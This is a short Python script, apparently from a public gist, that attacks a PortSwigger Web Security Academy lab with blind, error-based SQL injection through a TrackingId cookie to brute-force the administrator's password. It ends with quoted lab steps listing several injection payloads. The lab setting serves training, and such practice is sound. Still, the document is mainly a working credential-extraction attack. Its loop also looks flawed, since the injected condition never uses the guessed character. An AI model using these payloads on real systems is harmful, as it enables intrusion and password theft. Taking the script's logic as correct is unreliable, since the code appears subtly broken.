
# Source was from
#https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
import requests, string, sys, warnings, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

req = requests.Session()
url = "https://0a75002804a20d16848650000019003d.web-security-academy.net/filter?category=Pets"
hint = "Welcome back!"

# Cookie: TrackingId=h2dGFtb9XTYwq4zk; session=6hkZoumrQhrU9o4i03CQxdXkDpyTiePP
password = ""  # ag2yj74y5ng8k1uvbxni // length 21
# kthtccl0eonf2ki7z3ew
index = 1
password_length = 20

# For debugging
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
while True:
    if index > password_length:
        print("\n Finished at index = ", index)
        break
    for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9
        sys.stdout.write(f"\r[+] Password: {password}{char}")
        cookies = {
            "session": "6hkZoumrQhrU9o4i03CQxdXkDpyTiePP",
            "TrackingId": f"h2dGFtb9XTYwq4zk' ||(SELECT CASE WHEN LENGTH(password)<{index} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            }
        #TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if hint in resp.text:
            password = password + char
            index = index + 1



"""
You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Verify that the condition is true (the error is received), confirming that there is a user called administrator.

The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
This condition should be true, confirming that the password is greater than 1 character in length.

Send a series of follow-up values to test different password lengths. Send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Then send:

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
And so on. 

"""
